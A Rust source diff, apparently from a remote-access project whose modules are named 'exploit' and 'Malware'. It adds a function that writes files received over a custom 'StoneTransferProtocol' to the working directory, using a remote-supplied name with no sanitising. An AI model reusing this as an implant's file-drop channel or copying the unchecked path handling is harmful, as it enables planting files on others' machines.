@@ -2,6 +2,7 @@ mod exploit;
 mod stprotocol;
 mod structure;
 
+use bstr::ByteSlice;
 use exploit::{Exploits, Malware};
 use std::env;
 use std::fs::File;
@@ -50,10 +51,7 @@ fn event_loop(mut client: Session, mut packet: StructStone, mut exploit: Exploit
             }
             StoneTransferProtocol::Upload => {
                 // 타입이 Upload 일 경우
-                match String::from_utf8(packet.get_file()) {
-                    Ok(ok) => client.send(handle_download(&ok).stone),
-                    Err(_) => client.send_msg("File Not Found"),
-                }
+                client.send(handle_upload(packet.get_file()).stone)
             }
             StoneTransferProtocol::Disconnect => {
                 client.disconnect();
@@ -68,7 +66,7 @@ fn event_loop(mut client: Session, mut packet: StructStone, mut exploit: Exploit
 fn handle_download(path: &String) -> StructStone {
     let mut open_file = match File::open(path.replace("\\", "/")) {
         Ok(file) => file,
-        Err(error) => {
+        Err(_) => {
             return StructStonePayload::new(vec![], vec![], b"File Not Found".to_vec()).to_stone();
         }
     };
@@ -76,20 +74,38 @@ fn handle_download(path: &String) -> StructStone {
 
     match open_file.read_to_end(&mut file) {
         Ok(ok) => ok.to_le_bytes().to_vec(),
-        Err(error) => b"File Not Found".to_vec(),
+        Err(_) => b"File Not Found".to_vec(),
     };
+
+    // println!(
+    //     "{:?}",
+    //     StructStonePayload::new(vec![], vec![], file.clone())
+    //         .to_stone()
+    //         .payload_size()
+    // );
 
     StructStonePayload::new(vec![], vec![], file).to_stone()
 }
 
-// fn handle_upload(mut file: Vec<u8>) -> StructStone {
-//     let path = std::env::current_dir();
-//     let mut open_file = File::open(path).expect("File Not Found");
-//
-//     let file = match open_file.write_all(&mut file) {
-//         Ok(_) => format!("File {:?} upload successful", path,).to_vec(),
-//         Err(_) => b"File Not Found".to_vec(),
-//     };
-//
-//     StructStonePayload::new(vec![], vec![], file).to_stone()
-// }
+fn handle_upload(mut file: Vec<u8>) -> StructStone {
+    let file_arr: &[u8] = &file[..];
+    let mut fields: Vec<&[u8]> = file_arr.split_str("<name_end>").collect();
+    let path = format!(
+        "{:?}/{:?}",
+        env::current_dir().unwrap(),
+        String::from_utf8(Vec::from(fields[0])).unwrap()
+    )
+    .replace('"', "")
+    .replace("\\", "/");
+
+    let mut open_file = File::create(path.clone()).expect("File Not Found");
+
+    let file = match open_file.write_all(&mut fields[1]) {
+        Ok(_) => format!("File {:?} upload successful", path)
+            .as_bytes()
+            .to_vec(),
+        Err(_) => b"File Not Found".to_vec(),
+    };
+
+    StructStonePayload::new(vec![], vec![], file).to_stone()
+}
